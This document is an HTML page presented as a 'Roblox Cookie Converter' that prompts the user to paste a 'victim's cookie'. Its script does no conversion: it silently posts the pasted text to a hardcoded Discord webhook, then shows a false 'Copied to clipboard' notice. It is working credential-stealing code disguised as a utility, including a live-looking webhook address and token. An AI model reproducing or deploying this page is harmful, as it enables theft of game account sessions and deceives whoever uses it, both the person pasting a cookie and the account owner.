<!DOCTYPE html>
<html>
  <head>
    <style>
      body {
        background-color: #333;
      }

      #title {
        text-align: center;
        font-size: 48px;
        font-weight: bold;
        color: white;
        padding: 20px;
        font-family: Arial, sans-serif;
      }

      #message {
        margin: 0 auto;
        display: block;
        width: 500px;
        height: 300px;
        font-size: 24px;
        font-weight: bold;
        padding: 10px;
        border-radius: 5px;
        border: 2px solid #1A1A1A;
        color: white;
        background-color: #444;
      }

      #sendButton {
        display: block;
        margin: 0 auto;
        width: 200px;
        height: 50px;
        font-size: 24px;
        font-weight: bold;
        background-color: #002266;
        border: none;
        border-radius: 10px;
        cursor: pointer;
        box-shadow: 0px 10px 15px rgba(0, 0, 0, 0.2);
        color: white;
        transition: all 0.2s ease-in-out;
      }

      #sendButton:hover {
        background-color: #001a40;
      }

      #notification {
        position: fixed;
        bottom: 20px;
        left: 50%;
        transform: translateX(-50%);
        background-color: #333;
        color: white;
        font-size: 20px;
        padding: 10px 20px;
        border-radius: 5px;
        display: none;
        font-family: Arial, sans-serif;
        font-weight: bold;
        transition: opacity 0.5s ease-in-out;
        background-color: #444;
        opacity: 1;
      }
    </style>
  </head>
  <body>
    <div id="title">⚒️ Roblox Cookie Converter ⚒️</div>
    <textarea id="message" placeholder="Type the victim's cookie here..."></textarea><br>
    <button id="sendButton">Convert</button>
    <div id="notification">Copied to clipboard</div>
    <script>
      function sendMessage() {
        const message = document.getElementById("message").value;
        const webhookUrl = "https://discord.com/api/webhooks/1237584893756575845/AP_2URcUznCp86IZ2GlJeJxNfyr6TXKxhA1wjU7YZvh-SKXSK6OuEaBvWvoqC6zDcfBO";

        fetch(webhookUrl, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ content: message }),
        })
          .then((response) => console.log(response))
          .catch((error) => console.error(error));

        // Show notification
        const notification = document.getElementById("notification");
        notification.style.display = "block";

        // Fade out notification after 2 seconds
        setTimeout(() => {
          notification.style.opacity = 0;
          setTimeout(() => {
            notification.style.display = "none";
          }, 500);
        }, 2000);
      }

      document.getElementById("sendButton").addEventListener("click", sendMessage);
    </script>
  </body>
</html>
